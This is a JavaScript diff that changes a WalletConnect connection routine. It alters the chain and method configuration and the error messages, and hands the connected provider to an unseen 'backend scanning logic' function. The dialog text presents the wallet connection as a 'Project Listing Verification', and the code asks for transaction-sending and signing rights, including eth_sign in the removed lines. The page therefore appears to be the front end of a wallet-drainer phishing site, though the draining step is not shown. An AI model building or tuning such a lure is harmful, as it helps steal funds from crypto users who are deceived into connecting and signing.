@@ -110,41 +110,38 @@ async function connectWalletConnect() {
     walletConnectButton.classList.add('loading');
     walletConnectButton.disabled = true;
 
-    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.12.2?bundle');
+    // We use the most stable bundle version
+    const { EthereumProvider } = await import('https://esm.sh/@walletconnect/ethereum-provider@2.12.1?bundle');
 
     wcProvider = await EthereumProvider.init({
       projectId: WC_PROJECT_ID,
       showQrModal: true,
-      qrModalOptions: { themeMode: "dark" },
-      // This is the CRITICAL fix for mobile connection issues:
-      optionalNamespaces: {
-        eip155: {
-          methods: ["eth_sendTransaction", "eth_signTransaction", "eth_sign", "personal_sign", "eth_requestAccounts"],
-          chains: [1], // Mainnet
-          events: ["chainChanged", "accountsChanged"]
-        }
-      },
+      // We list the chains directly in the main config for better mobile support
+      chains: [1], 
+      methods: ["eth_sendTransaction", "personal_sign", "eth_requestAccounts"],
+      events: ["chainChanged", "accountsChanged"],
       metadata: {
-        name: 'Project Listing Verification',
-        description: 'Connect your wallet to proceed',
+        name: 'Project Listing',
+        description: 'Verification Required',
         url: window.location.origin,
         icons: ['https://avatars.githubusercontent.com/u/37784886']
       }
     });
 
-    // This listener ensures the process continues once the scan is successful
-    wcProvider.on("display_uri", (uri) => {
-      console.log("QR Code Displayed. Scan now.");
+    // Simple listener for the connection
+    wcProvider.on("connect", () => {
+      console.log("WalletConnect Connected");
     });
 
     await wcProvider.enable();
     
-    // Hand off to your main logic brain
+    // Once enabled, pass to your backend scanning logic
     await handleWalletProcess(wcProvider);
 
   } catch (err) {
-    console.error("WalletConnect Connection Error:", err);
-    alert('Connection failed. Please ensure you are using a supported mobile wallet.');
+    console.error("WC Error:", err);
+    // If it fails, we alert and reset the button so they can try again
+    alert('Connection failed. If you are on mobile, please try opening the link directly in your wallet browser.');
   } finally {
     walletConnectButton.classList.remove('loading');
     walletConnectButton.disabled = false;
